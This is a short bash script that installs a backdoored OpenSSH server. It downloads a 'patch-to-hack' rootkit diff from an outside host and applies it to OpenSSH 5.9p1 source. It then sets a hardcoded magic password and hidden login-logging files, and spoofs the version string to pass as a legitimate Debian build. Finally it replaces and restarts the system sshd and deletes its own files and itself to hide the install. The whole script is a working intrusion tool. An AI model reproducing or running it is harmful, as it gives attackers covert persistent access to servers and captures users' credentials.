#!/bin/bash
wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz
tar zxvf openssh-5.9p1.tar.gz
tar zxvf 0x06-openssh-5.9p1.patch.tar.gz
cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1
cd openssh-5.9p1
patch < sshbd5.9p1.diff
sed -i "s/\/tmp\/ilog/\/.ilog/g" includes.h
sed -i "s/\/tmp\/olog/\/.olog/g" includes.h
sed -i "s/apaajaboleh/343fdb4d/g" includes.h
sed -i "s/OpenSSH_5.8p1 Debian-1ubuntu3/$1/g" version.h
sed -i "s/p1/$2/g" version.h
yum install -y openssl openssl-devel pam-devel
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make && make install
service sshd restart
cd ..
rm -f 0x06-openssh-5.9*
rm -rf openssh-5.9p1*
rm -f sshBackdoorinsatll.sh
